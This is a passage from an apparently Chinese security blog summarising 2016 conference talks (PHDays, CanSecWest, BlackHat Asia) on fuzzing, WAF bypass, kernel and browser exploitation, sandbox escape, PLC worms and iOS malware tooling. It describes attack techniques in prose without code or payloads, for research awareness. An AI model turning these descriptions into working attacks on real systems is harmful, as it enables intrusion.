<h3 id="3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》"><a href="#3、《Scalable-and-Effective-Fuzzing-of-Google-Chrome-Browser》" class="headerlink" title="3、《Scalable and Effective Fuzzing of Google Chrome Browser》"></a>3、《Scalable and Effective Fuzzing of Google Chrome Browser》</h3><p><img src="/media/14641421571387/14641573779613.jpg" alt=""></p>
<p>介绍Google的分布式Fuzzing系统——CluterFuzz，采用集群服务器进行分布式Fuzzing，大概4000多台机器，不排除使用虚拟机的情况。议题介绍了一些Fuzz变异算法、漏洞类型识别、代码覆盖率问题、自动化精简样本，以及各种sanitizers功能的使用，比较常用的还是Address Sanitizer，且各平台通用。</p>
<h3 id="4、《Web-Application-Firewall-Bypassing》"><a href="#4、《Web-Application-Firewall-Bypassing》" class="headerlink" title="4、《Web Application Firewall Bypassing》"></a>4、《Web Application Firewall Bypassing》</h3><p><img src="/media/14641421571387/14641659037475.jpg" alt=""></p>
<p>总结绕过AWF的三大策略：</p>
<ul>
<li><strong>1、预处理利用</strong>：即设法绕过WAF的输入验证，比如HTTP头（X-Originating-IP、X-Forwarded-For、X-Remote-IP、X-Remote-Addr）的处理，就曾多次被用于绕过公司WAF的SQL注入防护，或者HTTP方法头GET/POST的篡改、换行符的处理等等方式；</li>
<li><strong>2、致阻断失配</strong>：利用前后端数据处理的差异，使得无法匹配到黑名单里的规则，通常结合一些参数污染、字符编码、注释符等多种方式绕过；</li>
<li><strong>3、规则集绕过</strong>：通过暴力枚举出WAF的拦截规则，或者逆向WAF程序获取规则，然后再设法绕过。</li>
</ul>
<h3 id="5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》"><a href="#5、《Mobile-Communications-are-Insecure-Evidence-Based-Arguments》" class="headerlink" title="5、《Mobile Communications are Insecure. Evidence-Based Arguments》"></a>5、《Mobile Communications are Insecure. Evidence-Based Arguments》</h3><p><img src="/media/14641421571387/14642298519901.jpg" alt=""></p>
<p>由于当前移动通讯网络采用许多过旧技术，导致一些漏洞遗留其中，主要是针对SS7第7号信令系统的漏洞情况进行统计，其中主要三大威胁是：拒绝服务、信息泄露（比如短信、通话内容、IMEI、地理位置等等）、欺诈。并现场演示短信窃取，实现社交帐号的盗取，并成功获取历史聊天记录。</p>
<h3 id="6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》"><a href="#6、《Fingerprinting-and-Attacking-a-Healthcare-Infrastructure》" class="headerlink" title="6、《Fingerprinting and Attacking a Healthcare Infrastructure》"></a>6、《Fingerprinting and Attacking a Healthcare Infrastructure》</h3><p><img src="/media/14641421571387/14642478498497.jpg" alt=""><br>作者分享了一些关于医疗设备攻击的思路，比如通过网络空间搜索引擎Shodan/Censys/Maltego去查找网络上的医疗设备，介绍如何通过设备指纹去查找医疗设备，目前很多医疗设备存在允许未授权的访问，特别容易导致敏感信息泄露，甚至允许远程操作医疗设备，可能影响到患者的健康问题，最后他提供一些针对医疗设备攻击的防御方案。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href="/2016/05/25/PHDays-2016/#comment" class="comment-link">评论</a>
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
  
  <div class="categories">
    <a href="/categories/技术分享/">技术分享</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/PHDays/">PHDays</a>
  </div>

        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-04-13T03:47:32.000Z"><a href="/2016/04/13/CanSecWest_2016/">2016-04-13</a></time>
      
      
  
    <h1 class="title"><a href="/2016/04/13/CanSecWest_2016/">CanSecWest 2016 大会议题分析</a></h1>
  

    </header>
    <div class="entry">
      
        <p>本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于<strong>系统/软件漏洞挖掘与利用技术</strong>。</p>
<p>各议题下载链接参见：<a href="http://www.slideshare.net/CanSecWest/presentations" target="_blank" rel="external">http://www.slideshare.net/CanSecWest/presentations</a></p>
<h3 id="1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》"><a href="#1、《Sandbox-Escape-with-Generous-Help-from-Security-Software》" class="headerlink" title="1、《Sandbox Escape with Generous Help from Security Software》"></a>1、《Sandbox Escape with Generous Help from Security Software》</h3><p><img src="/media/14605192523708/14605295530449.jpg" alt=""></p>
<p>腾讯玄武实验室分享的杀毒软件漏洞挖掘技巧，比如BitDefender、Comodo、Avast、Kaspersky等等国外知名杀软厂商，大多是一些敏感功能未鉴权导致的代码执行或者信息泄露的问题，比如攻击者伪造IO请求去读写、执行本地文件。这里比较好的一点是在漏洞利用场景上，他们将杀软漏洞用来绕过沙盒保护，因为杀软漏洞可以直接以System最高权限执行，允许直接关闭一些软件的沙盒防护。</p>
<h3 id="2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》"><a href="#2、《Don’t-Trust-Your-Eye-Apple-Graphics-Is-Compromised》" class="headerlink" title="2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》"></a>2、《Don’t Trust Your Eye-  Apple Graphics Is Compromised》</h3><p><img src="/media/14605192523708/14605302948646.jpg" alt=""></p>
<p>腾讯科恩实验室分享的关于OSX/iOS内核驱动漏洞挖掘的方法，主要介绍了两种Fuzzing策略：</p>
<ul>
<li><strong>被动Fuzzing</strong>：<strong>通过Hook IOKit API（IOConnectMapMemory/IOConnectUnmapMemory/IOConnectCallMethod/IOConnectCallScalarMethod），随机变异参数值</strong>；</li>
<li><strong>主动Fuzzing</strong>：<strong>通过脚本自动提取驱动的接口函数与参数信息，然后发送畸形数据去调用</strong>。</li>
</ul>
<p>最后列举一个竞争条件漏洞实例，介绍漏洞成因与利用方法。</p>
<h3 id="3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》"><a href="#3、《Automatic-Binary-Constraint-Solving-Automatic-Exploit-Generation》" class="headerlink" title="3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》"></a>3、《Automatic Binary Constraint Solving: Automatic Exploit Generation》</h3><p><img src="/media/14605192523708/14605312840771.jpg" alt=""></p>
<p>分享自动生成利用代码的工具AEG，主要针对混合读写操作导致的漏洞，通过PIN进行指令插桩，利用符号执行（Symbolic Execution）和混合执行（Concolic Execution）一块去实现程序的动态分析与利用代码生成。<br><strong>PS：整体思路跟以往挖掘漏洞中用于分析代码执行路径，增加代码覆盖率的思路一致，用在漏洞挖掘与分析上比较可行，但自动生成利用代码估计效果不好。</strong></p>
<h3 id="4、《Pwn-a-Nexus-device-with-a-single-vulnerability》"><a href="#4、《Pwn-a-Nexus-device-with-a-single-vulnerability》" class="headerlink" title="4、《Pwn a Nexus device with a single vulnerability》"></a>4、《Pwn a Nexus device with a single vulnerability》</h3><p><img src="/media/14605192523708/14605317938560.jpg" alt=""></p>
<p>来自360的分享，是其在Pwn2Own Mobile 2015上用于攻破Nexus手机的chrome浏览器漏洞CVE-2015-6764。议题对该漏洞的成因、利用和补丁代码都进行了分析，是一个越界访问漏洞，通过越界读写内存造成地址泄露，从而再绕过ASLR。该议题提到的利用方式（<strong>RCE2UXSS、UXSS2RCE</strong>）比较奇妙,在利用漏洞获取执行代码的权限后，<strong>通过hook ScriptLoader::executeScript去注入Javascript代码，然后在 <a href="https://play.goolge.com" target="_blank" rel="external">https://play.goolge.com</a> 域下通过JS去安装任意APP</strong>。</p>
<h3 id="5、《BadWinmail-and-Email-Security-on-Outlook》"><a href="#5、《BadWinmail-and-Email-Security-on-Outlook》" class="headerlink" title="5、《BadWinmail and Email Security on Outlook》"></a>5、《BadWinmail and Email Security on Outlook》</h3><p><img src="/media/14605192523708/14605992256618.jpg" alt=""></p>
<p>在msg文件格式中嵌入OLE对象，然后更改CLSID为Flash控件或者PDF控件，利用这些控件的漏洞直接实现利用。另外还可传输不确定封装格式 (TNEF，附件名为winmail.dat) ，它也支持OLE，然后采用上述相同攻击方法实现利用。用户在使用Outlook打开上述邮件时即可直接执行任意代码。</p>
<h3 id="6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》"><a href="#6、《Getting-Physical-Extreme-abuse-of-Intel-based-Paging-Systems》" class="headerlink" title="6、《Getting Physical Extreme abuse of Intel based Paging Systems》"></a>6、《Getting Physical Extreme abuse of Intel based Paging Systems》</h3><p><img src="/media/14605192523708/14606052304309.jpg" alt=""></p>
<p>讲述利用操作系统的分页机制去绕过各种内核安全机制，比如DEP、KASLR、NULL解引用保护、SMEP等等，主要针对Linux与Windows，并提供有demo代码。传统方法可能更多的是借助信息泄露漏洞，利用泄露地址去绕过上述保护，利用他们提供的方法甚至可允许非特权用户dump到内核访问的物理内存。主要利用以下缺陷：</p>
<ul>
<li>分页表位于固定虚拟地址（Windows）；</li>
<li>分页表可写(Windows);</li>
<li>PDPTs、PDs与PTs位于固定虚拟地址（Linux）;</li>
<li>分页结构可写（Linux)。</li>
</ul>
<p>比如Windows上，可以利用任意写地址漏洞去将PTE分页表（固定地址）中的指针修改为HAL堆上的物理内存地址,HAL堆上包含有一堆函数指针，包括hal!HalpApicRequestInterrupt函数，最后结合ROP就可以禁用SMEP保护，最终获得系统权限。还有其它页目录堆喷的利用方式，Linux上稍有不同，但攻击思路类似。</p>
<h3 id="7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》"><a href="#7、《Execute-My-Packet-Exodus-of-Shells-from-a-Firewall-》" class="headerlink" title="7、《Execute My Packet (Exodus of Shells from a Firewall)》"></a>7、《Execute My Packet (Exodus of Shells from a Firewall)》</h3><p><img src="/media/14605192523708/14606157550780.jpg" alt=""></p>
<p>Cisco ASA Adaptive Security Appliance是个IP路由器，具备防火墙、反病毒、入侵检测和VPN服务器的功能，它的IKE(网络密钥交换)版本v1和v2存在堆溢出漏洞（CVE-2016-1287），利用漏洞允许未授权的用户实现远程代码执行。该议题分析了导致漏洞的成因以及利用方法，目前官方已修复此漏洞。</p>
<h3 id="8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》"><a href="#8、《Bypassing-Different-Defense-Schemes-via-Crash-Resistant-Probing-of-Address-Space》" class="headerlink" title="8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》"></a>8、《Bypassing Different Defense Schemes via Crash-Resistant Probing of Address Space》</h3><p><img src="/media/14605192523708/14606192691752.jpg" alt=""></p>
<p>作者在不借助地址泄露的情况下，使用“崩溃恢复”（Crash-Resistant）功能去绕过DEP、ASLR、CFG等多个安全机制。</p>
<ul>
<li><strong>通过内存扫描获取地址</strong>：结合堆喷射，利用漏洞篡改数据类型相关（比如整数）的1个字节，从而伪造出JS对象，接着在web worker中使用setInerval函数去使用伪造的JS对象，这里使用setInerval是为了使用Crash-Resistant功能，有了JS对象就有了可控的虚表指针，再通过扫描内存获取TEB（线程环境块）基址、DLL基址等信息。</li>
<li><strong>创建Blob对象来绕过EAF+</strong>：另外还演示了如何绕过EMEt 5.5 的EAF和EAF+保护，作者通过创建Blob对象来解决，因为它会调用到未在EAF+黑名单里面的ntdll模块，进而解决导出表的安全限制问题。</li>
<li><strong>利用函数链（Function Chaining）绕过CFG</strong>：在控制虚表函数指针后，利用5个未被EMET禁用的导出函数（利用networkx 和miasm2工具去搜索的），依次调用组成一个函数调用链，最终调用LdrInitShimEngineDynamic([fakeStr + 0x8] + 0x20, [fakeStr] + 0x18)，这里的两个参数都是可控的，从而实现任意DLL的加载。</li>
</ul>
<h3 id="9、《Virtualization-Device-Emulator-Testing-Technology》"><a href="#9、《Virtualization-Device-Emulator-Testing-Technology》" class="headerlink" title="9、《Virtualization Device Emulator Testing Technology》"></a>9、《Virtualization Device Emulator Testing Technology》</h3><p><img src="/media/14605192523708/14606253312145.jpg" alt=""></p>
<p>通过分析虚拟设备模拟器的攻击面，主要针对各个硬件虚拟组件进行Fuzzing，通过系统hook模块去获取各个设备模拟器，然后从服务端向各个模拟器客户端发送畸形数据，再根据客户端返回的日志进行分析。</p>
<h3 id="10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》"><a href="#10、《Hardsploit-project-All-In-One-Tool-for-Hardware-Security-Audit》" class="headerlink" title="10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》"></a>10、《Hardsploit project : All-In-One Tool for Hardware Security Audit》</h3><p><img src="/media/14605192523708/14606908008051.jpg" alt=""></p>
<p>Hardsploit项目是一个硬件安全审计框架，支持多种硬件接口，比如I2C, JTAG, SPI, PARALLEL, UART，主要应用在物联网产品的安全审计上。通过工具可以提取存储在芯片上各种数据，读写以及嗅探传输数据，便于后续作分析，而且还提供有界面、API接口等等功能。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href="/2016/04/13/CanSecWest_2016/#comment" class="comment-link">评论</a>
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
  
  <div class="categories">
    <a href="/categories/技术分享/">技术分享</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/CanSecWest/">CanSecWest</a>
  </div>

        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2016-04-05T02:27:11.000Z"><a href="/2016/04/05/bh-asia-2016/">2016-04-05</a></time>
      
      
  
    <h1 class="title"><a href="/2016/04/05/bh-asia-2016/">BlackHat Asia 2016 大会议题分析报告</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="1、《A-New-CVE-2015-0057-Exploit-Technology》"><a href="#1、《A-New-CVE-2015-0057-Exploit-Technology》" class="headerlink" title="1、《A New CVE-2015-0057 Exploit Technology》"></a>1、《A New CVE-2015-0057 Exploit Technology》</h2><p><img src="/media/bh-asia-2016/14598336783953.jpg" alt=""></p>
<p>来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。<br><strong>【传统攻击方法】</strong>：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。<br><strong>【新型攻击方法】</strong>：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。</p>
<h3 id="2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》"><a href="#2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》" class="headerlink" title="2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》"></a>2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》</h3><p><img src="/media/bh-asia-2016/14598369926110.jpg" alt=""></p>
<p>东北大学（美国）的4位安全研究员开发出一款叫CrossFire的轻量级静态分析工具，用于自动化挖掘Firefox插件漏洞（对方称为”Externsion-reuse“漏洞），其实就是利用插件原有的敏感功能去执行恶意行为，比如窃取cookie、历史记录等敏感信息。Firefox插件是通过Javascript调用Friefox提供的API实现的附加功能，因此CrossFire是通过静态分析插件的JS代码，构建出抽象语法树，然后跟收集的敏感API数据库做综合分析，API数据库就是定义输入源（source）和输出目标（sink）的内容，然后基于污点传播的思路去做判断，如果检测到漏洞还可以根据原定规则生成exploit。<br><strong>【PS】</strong>:==基于污点传播的静态分析思路，偏学术研究，估计误报会比较多，往往还需要人工介入排查，效果不见得会很好。==</p>
<h3 id="3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》"><a href="#3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》" class="headerlink" title="3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》"></a>3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》</h3><p><img src="/media/bh-asia-2016/14598401954245.jpg" alt=""></p>
<p>关于动态二进制插桩的检测与逃逸方法，用来对抗程序被动态分析,主要针对PIN与DynamoRIO两款插桩工具的特点进行分析。<br><strong>【检测方法】</strong>：分主动与被动检测方案，主动检测包括扩展的指令代码（Xmode Code，会导致栈桢大小不同）、代码缓存、TLS和异常上下文，而被动检测包括未支持的指令和行为功能。<br><strong>【逃逸方法】</strong>：通过代码缓存进行自修改，以及一些栈、TLS和其它DBI框架特有的数据结构，比如.charmve段、BrokerClient回调函数等等方法入手。</p>
<h3 id="4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》"><a href="#4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》" class="headerlink" title="4、《Bypassing Browser Security Policies For Fun And Profit》"></a>4、《Bypassing Browser Security Policies For Fun And Profit》</h3><p><img src="/media/bh-asia-2016/14598412838122.jpg" alt=""></p>
<p>讲述Android浏览器绕过同源策略的UXSS漏洞，都是以一些历史漏洞为例讲解漏洞的利用方式（含PoC）,包括窃取cookie、读取本地文件，以及绕过Google Play的限制实现任意app的安装。==议题主要是对过去漏洞的总结，并没有太多新颖的思路。==</p>
<h3 id="5、《DSCompromised-A-Windows-DSC-Attack-Framework》"><a href="#5、《DSCompromised-A-Windows-DSC-Attack-Framework》" class="headerlink" title="5、《DSCompromised: A Windows DSC Attack Framework》"></a>5、《DSCompromised: A Windows DSC Attack Framework》</h3><p><img src="/media/bh-asia-2016/14598431026382.jpg" alt=""></p>
<p>DSC（Desired State Configuration，期望状态配置）是Windows上的配置管理平台，它通过向PowerShell语言中引进一个非常简单的语法声明，和一个用来接收和应用这些配置的内置引擎来实现的。DSCompromised即是一款基于PowerShell的工具，用于借助DSC来实现命令控制、恶意软件驻留、回连后门等等功能。该工具已在github上开源：<a href="https://github.com/matthastings/DSCompromised。" target="_blank" rel="external">https://github.com/matthastings/DSCompromised。</a></p>
<h3 id="6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》"><a href="#6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》" class="headerlink" title="6、《Enterprise Apps: Bypassing The iOS Gatekeeper》"></a>6、《Enterprise Apps: Bypassing The iOS Gatekeeper》</h3><p><img src="/media/bh-asia-2016/14598447131786.jpg" alt=""></p>
<p>介绍iOS企业证书滥用的问题，并列举近年来出现过一些大的iOS安全事件，比如”假面攻击“、WireLurker病毒等等案例，同时讲述其它存在的风险，==比如通过中间人方式去劫持企业的移动设备管理服务器，然后替换请求安装的app，从而使得用户安装被企业证书签名过的恶意软件==。</p>
<h3 id="7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》"><a href="#7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》" class="headerlink" title="7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》"></a>7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》</h3><p><img src="/media/bh-asia-2016/14598465162889.jpg" alt=""></p>
<p>列举出当前Linux和PaX(用于安全加固的Linux内核补丁)平台上的ASLR绕过漏洞，共有4个问题：</p>
<ul>
<li>==低熵==，即地址随机度不够，可被暴力破解，尤其是32位系统</li>
<li>==非均匀分布随机地址==，呈驼峰型分布，因此有部分地址存在高命中率</li>
<li>==利用对象间的相对地址偏移实现绕过==，即Offset2Lib攻击方法</li>
<li>==进程继承缺陷==，所有子进程共享相同的内存</li>
</ul>
<p>最后提出下一代ASLR防护机制：ASLR-NG，以解决上述问题。</p>
<h3 id="8、《Hacking-a-Professional-Drone》"><a href="#8、《Hacking-a-Professional-Drone》" class="headerlink" title="8、《Hacking a Professional Drone》"></a>8、《Hacking a Professional Drone》</h3><p><img src="/media/bh-asia-2016/14598494382580.jpg" alt=""></p>
<p>议题中提出两种攻击无人机的方法：</p>
<ul>
<li>==破解WEP加密的WiFi密码==，直接接入与遥控器通讯；</li>
<li>==伪造XBee 868LP通讯设备作为中间人==，发送控制指令（逆向Android客户端获得指令序列），从而实现无人机的劫持<br><strong>【PS】</strong>：==从攻击难度看，此款无人机的安全性比较低，跟大疆无人机存在较大差距==。</li>
</ul>
<h3 id="9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》"><a href="#9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》" class="headerlink" title="9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》"></a>9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》</h3><p><img src="/media/bh-asia-2016/14599077404076.jpg" alt=""></p>
<p>由于KeenLab分享的Android Binder Fuzzing相关的议题，分析出Binder存在的攻击面，然后制定相应的Fuzzing策略。<br><strong>【亮点一】</strong>：==从Android C++源码中自动化提取各Binder服务通讯中的 Transaction Code、参数类型及序号、远程服务的调用方式，然后生成json文件，依据它来作参数变异==。如果是闭源的Binder服务，比如华为手机，则通过IDAPython从程序中提取上述信息。<br><strong>【亮点二】</strong>：==开启ASAN（AddressSanitize）去编译源码==，加强程序自主的错误检测能力，同时==结合AFL==（Google开发的一款基于源码插桩的Fuzzer工具，曾被用于刷过N多CVE漏洞）去做Fuzzing，==但AFL是基于文件输入的，而Binder未提供此功能，因此KeenLab也未完全实现，这是他们一直在尝试做的工作==。<br><strong>【亮点三】</strong>：最后以几个Binder服务漏洞作为实例分析漏洞成因，并分享了CVE-2015-6620 MediaCodecInfo 越界访问漏洞的利用技巧，采用ROP与Heap Spray去绕过NX与ASLR。</p>
<h3 id="10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》"><a href="#10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》" class="headerlink" title="10、《I’m Not a Human: Breaking the Google reCAPTCHA》"></a>10、《I’m Not a Human: Breaking the Google reCAPTCHA》</h3><p><img src="/media/bh-asia-2016/14599122751659.jpg" alt=""></p>
<p>Google的reCAPTCHA是一款验证码生成系统，作者分享了一些绕过该验证码系统的方法。比如：</p>
<ul>
<li>通过深度学习为图片注释，使用基于Word2Vec神经网络进行深度学习去为图片标记归类</li>
<li>收集样本图片、提示信息、注释标签等信息</li>
<li>通过Google服务（图片搜索、翻译等）获取关键词</li>
<li>……</li>
</ul>
<h3 id="11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》"><a href="#11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》" class="headerlink" title="11、《Let’s See What’s Out There - Mapping The Wireless IOT》"></a>11、《Let’s See What’s Out There - Mapping The Wireless IOT》</h3><p><img src="/media/bh-asia-2016/14599134045481.jpg" alt=""></p>
<p>分享物联网产品中常用的无线电安全问题，比如ZigBee、WiFi、GSM、NFC、车钥匙信号等等。介绍分析无线电的硬件、软件工具，以及常见的TOP 10无线安全问题，前3名分别是：未加密通讯、信息重放攻击、密钥交换漏洞。<br>==【PS】:主要是无线电安全的基础知识的概述，工具和常见漏洞类型等等，无实例漏洞分析，里面涉及的内容，预研侧此前大多有分析过。==</p>
<h3 id="12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》"><a href="#12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》" class="headerlink" title="12、《PLC-Blaster：A Worm Living Solely in the PLC》"></a>12、《PLC-Blaster：A Worm Living Solely in the PLC》</h3><p><img src="/media/bh-asia-2016/14599217768327.jpg" alt=""></p>
<p>作者开发出一款叫PLC-Blaster的PLC（可编程控制器）蠕虫病毒，以西门子S7-1200版本1到3的PLC为例。西门子PLC使用自定义协议去上传和下载用户程序到PLC，也可以读取PLC相关诊断信息，因此常被用作攻击PLC的手段之一。此款PLC病毒使用SCL编程语言实现的，它会去扫描本地网络，若发现其它PLC则会上传病毒进行感染，实现自我传播的功能。同时它还会主动连接C&amp;C服务器，以实现远程控制功能。<br>==【PS】：难点就在于对S7-1200 PLC的协议分析，只有分析清楚之后，才能使用SCL去实现自我传播的功能。==</p>
<h3 id="13、《Practical-New-Developments-In-The-BREACH-Attack》"><a href="#13、《Practical-New-Developments-In-The-BREACH-Attack》" class="headerlink" title="13、《Practical New Developments In The BREACH Attack》"></a>13、《Practical New Developments In The BREACH Attack》</h3><p><img src="/media/bh-asia-2016/14599232870147.jpg" alt=""></p>
<p>分享关于SSL BREACH（超文本自适应压缩浏览器勘测与渗透）攻击方法的新进展，BREACH攻击方法最初是在<a href="http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf" target="_blank" rel="external">BlackHat USA 2013大会</a>被公布的。作者开发出一款叫”rupture“的攻击框架，并在<a href="https://github.com/dionyziz/rupture" target="_blank" rel="external">github</a>上开源，用于实现改进后的BREACH攻击，以及针对其它压缩加密算法的攻击。</p>
<h3 id="14、《The-Perl-Jam-2-The-Camel-Strikes-Back》"><a href="#14、《The-Perl-Jam-2-The-Camel-Strikes-Back》" class="headerlink" title="14、《The Perl Jam 2: The Camel Strikes Back》"></a>14、《The Perl Jam 2: The Camel Strikes Back》</h3><p><img src="/media/bh-asia-2016/14599279606791.jpg" alt=""></p>
<p>Perl在之前被发现存在多个高危漏洞，而官方一直将问题归结于开发者，作者表示很气愤，认为这个锅不应该由开发者来背。于是，作者分享了他发现的存在于perl核心模块0day漏洞，此漏洞影响所有使用perl开发CGI的程序，可造成远程代码执行。</p>
<h3 id="15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》"><a href="#15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》" class="headerlink" title="15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》"></a>15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》</h3><p><img src="/media/bh-asia-2016/14599250665173.jpg" alt=""></p>
<p>分享==非越狱iOS平台==上的恶意软件相关的议题，列举过去的发生的一些案例，然后总结出一些恶意软件的常用工具和方法：</p>
<ul>
<li>==重打包==：在正常应用中加入恶意代码，然后重新签名打包</li>
<li>==Dylib注入==</li>
<li><a href="https://github.com/BishopFox/theos-jailed" target="_blank" rel="external">Cycript</a>：支持javascript和OC语法的解析工具，可用于调试运行时程序，支持越狱与非越狱平台</li>
<li><a href="https://github.com/BishopFox/theos-jailed" target="_blank" rel="external">Theos</a>：iOS平台上的Hook框架，支持越狱与非越狱平台，但仍需要开发者帐号用于签名，详见：====</li>
<li><a href="https://github.com/fastlane/fastlane" target="_blank" rel="external">Fastlane tools</a>：iOS开发的持续集成框架，用于实现实现应用发布流程的自动化。</li>
</ul>
<p>最后作者开源出一款叫”==<a href="https://github.com/fastlane/fastlane" target="_blank" rel="external">Su-A-Cyder</a>==“的iOS恶意软件生成工具，后面作者还打算尝试将Metasploit移植到未越狱的iOS平台上。</p>
<h3 id="16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》"><a href="#16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》" class="headerlink" title="16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》"></a>16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》</h3><p><img src="/media/bh-asia-2016/14599283806453.jpg" alt=""></p>
<p>作者分享了如何利用深度学习与自然语言处理去建立一个基于实时分析海量DNS数据的威胁监控框架，主要用于检测恶意钓鱼的域名站点，并发现了不少伪造Google、Apple、Paypal等知名站点的钓鱼网站。</p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href="/2016/04/05/bh-asia-2016/#comment" class="comment-link">评论</a>
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
  
  <div class="categories">
    <a href="/categories/技术分享/">技术分享</a>
  </div>

        
  
  <div class="tags">
    <a href="/tags/BlackHat/">BlackHat</a>
  </div>

        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  <div class="search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="搜索">
    <input type="hidden" name="q" value="site:yoursite.com">
  </form>
</div>

  
<div class="widget tag">
  <h3 class="title">最新文章</h3>
  <ul class="entry">
    
      <li>
        <a href="/2016/06/05/osx_rootkit_rubilyn_analyze/">Mac OSX rootkit rubilyn 源码分析</a>
      </li>
    
      <li>
        <a href="/2016/05/25/PHDays-2016/">PHDays安全大会议题分析</a>
      </li>
    
      <li>
        <a href="/2016/04/13/CanSecWest_2016/">CanSecWest 2016 大会议题分析</a>
      </li>
    
      <li>
        <a href="/2016/04/05/bh-asia-2016/">BlackHat Asia 2016 大会议题分析报告</a>
      </li>
    
  </ul>
</div>


  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/技术分享/">技术分享</a><small>4</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
